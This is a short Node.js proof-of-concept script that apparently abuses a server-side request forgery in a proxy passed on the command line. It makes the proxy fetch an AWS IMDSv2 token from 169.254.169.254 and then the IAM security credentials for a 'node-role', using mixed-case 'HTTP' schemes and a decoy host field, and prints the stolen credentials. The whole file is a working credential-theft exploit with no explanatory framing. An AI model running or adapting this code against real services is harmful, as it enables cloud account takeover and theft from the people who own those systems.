const axios = require("axios");
const proxy = process.argv[2];
async function main() {
  const token = await axios.post(proxy, {
    host: "https://bishopfox.com/", url: "HTTP://169.254.169.254/latest/api/token/",
    method: "PUT", headers: {"X-aws-ec2-metadata-token-ttl-seconds": "21600"}
  });
  const credentials = await axios.post(proxy, {
    host: "https://bishopfox.com/", url: "httP://169.254.169.254/latest/meta-data/iam/security-credentials/node-role",
    method: "GET", headers: {"X-aws-ec2-metadata-token": token.data}
  });
  console.log(credentials.data);
}
main();
